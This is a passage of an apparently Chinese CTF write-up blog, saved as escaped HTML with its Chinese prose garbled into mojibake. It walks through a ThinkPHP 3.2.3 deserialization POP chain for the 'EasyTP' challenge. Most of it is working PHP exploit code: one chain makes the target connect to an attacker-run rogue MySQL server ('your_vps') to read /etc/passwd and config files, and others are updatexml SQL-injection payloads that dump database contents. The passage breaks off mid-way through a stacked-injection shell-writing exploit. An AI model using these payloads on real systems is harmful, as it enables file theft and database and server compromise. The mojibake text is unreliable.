&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tt&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€¦â€¦tensorflowï¼Œå®Œå…¨ä¸æ‡‚å•Šå“¥ï¼Œä½ è€ƒçš„çŸ¥è¯†å¤ªé«˜é›…äº†ï¼Œæˆ‘ä¿—äººä¸€ä¸ªï¼Œå’‹å°±è¾“å…¥ä¸€ä¸ªaaaaaabxCZCå°±æœ‰flagäº†å•Š&lt;/p>
&lt;p>&lt;a href="https://github.com/RManLuo/ciscn2019_final_web4">ä½œè€…wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[çº¢æ˜Žè°·CTF 2021]EasyTP
&lt;/h4>
&lt;/summary>
&lt;p>tp3.2.3ï¼Œæœ‰ä¸€ä¸ªçŽ°æˆçš„é“¾å­ï¼š&lt;a href="https://f5.pm/go-53579.html">ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png" alt="image-20211219155134609">&lt;/p>
&lt;p>çœ‹Application\Home\Controller\IndexController.class.phpçš„ä»£ç ä¹Ÿè·Ÿè¿™ä¸ªæ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç å¤§å·®ä¸å·®ï¼Œé¡ºç€è¿™ç¯‡æ–‡ç« çš„æ€è·¯è·Ÿä¸€ä¸‹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯å…¨å±€å¯»æ‰¾&lt;code>__destruct()&lt;/code>å‡½æ•°&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163343446.png" alt="image-20211219163343446">&lt;/p>
&lt;p>å¯»æ‰¾ä¸€ä¸ª&lt;code>destroy()&lt;/code>&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163445086.png" alt="image-20211219163445086">&lt;/p>
&lt;p>è¿™é‡Œéœ€è¦ä¸€ä¸ª&lt;code>$sessID&lt;/code>ï¼ŒPHP7ä¸‹ä¸ä¼ å‚ä¼šæŠ¥é”™ PHP5ä¸å½±å“ï¼Œ&lt;code>$this-&amp;gt;sessionName&lt;/code>å¯æŽ§ï¼›æŽ¥ç€æ‰¾å«æœ‰&lt;code>delete()&lt;/code>çš„ç±»&lt;/p>
&lt;p>www/ThinkPHP/Mode/Lite/Model.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163653936.png" alt="image-20211219163653936">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163713363.png" alt="image-20211219163713363">&lt;/p>
&lt;p>ç›¸å½“äºŽä¼ å…¥çš„å‚æ•°éƒ½å¯ç”¨ï¼Œå¯ä»¥æŽ§åˆ¶è‡ªå¸¦çš„æ•°æ®åº“ç±»çš„&lt;code>delete()&lt;/code>æ–¹æ³•äº†&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Db/Driver.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219170053771.png" alt="image-20211219170053771">&lt;/p>
&lt;p>å®ƒæ˜¯æ‹¼æŽ¥äº†$sqlè¯­å¥ï¼Œä¹‹åŽæ‰§è¡Œ&lt;code>$this-&amp;gt;execute()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171035987.png" alt="image-20211219171035987">&lt;/p>
&lt;p>å®ƒä¼šé¢„å…ˆè¿›è¡Œ&lt;code>$this-&amp;gt;initConnect()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171103370.png" alt="image-20211219171103370">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171123961.png" alt="image-20211219171123961">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶&lt;code>$config&lt;/code>ï¼ŒæŽ§åˆ¶è¿žæŽ¥ä»»æ„æ•°æ®åº“&lt;/p>
&lt;p>è¿™é‡Œå¯ä»¥ç»“åˆMySQLæ¶æ„æœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶è¿™ä¸ªæ´žäº†ï¼ˆé¢˜ç›®å¯ä»¥å‚è€ƒ&lt;a href="https://evoa.me/archives/4/#mysql%E5%BC%B1%E5%8F%A3%E4%BB%A4">[DDCTF 2020]mysqlå¼±å£ä»¤&lt;/a>ï¼‰ï¼Œåˆ©ç”¨è¿‡ç¨‹å°±æ˜¯è¿™æ ·ï¼š&lt;/p>
&lt;ul>
&lt;li>é€šè¿‡æŸå¤„æ³„éœ²å¾—åˆ°ç›®æ ‡çš„WEBç›®å½•ï¼ˆå¦‚DEBUGé¡µé¢&lt;/li>
&lt;li>å¼€å¯MySQLä¼ªæœåŠ¡ç«¯ï¼Œè¯»å–ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;li>å‡ºå‘ååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘PDOè¿žæŽ¥éƒ¨åˆ†&lt;/li>
&lt;li>èŽ·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;p>ä»¥æœ¬é¢˜ä¸ºæ¼”ç¤ºï¼Œä½¿ç”¨bettercapåšmysqlä¼ªæœåŠ¡ç«¯è¯»ä¸€ä¸‹/etc/passwd&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
&lt;p>çœ‹åˆ°äº†mysqlç”¨æˆ·ï¼Œå¼±å£ä»¤å¯†ç root&lt;/p>
&lt;p>ä¹‹åŽå°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ä¼ªæœåŠ¡ç«¯æ’¤äº†ï¼Œæ¢æˆçœŸæœåŠ¡ç«¯çš„ï¼Œè¿›è¡Œä¸€ä¸ªæ³¨å…¥&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡è¿›è¡Œååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘&lt;code>DELETE&lt;/code>è¯­å¥çš„SQLæ³¨å…¥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬è¿˜å¯ä»¥æŠŠå †å æ‰“å¼€ï¼Œç”¨å †å æ³¨å…¥å†™shellï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„expï¼ˆå‚è€ƒ&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">èµµæ€»çš„exp&lt;/a> èµµæ€»ç‰›é€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// æ‰“å¼€å †å æ³¨å…¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// çŒœå‡ºå¼±å£ä»¤
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
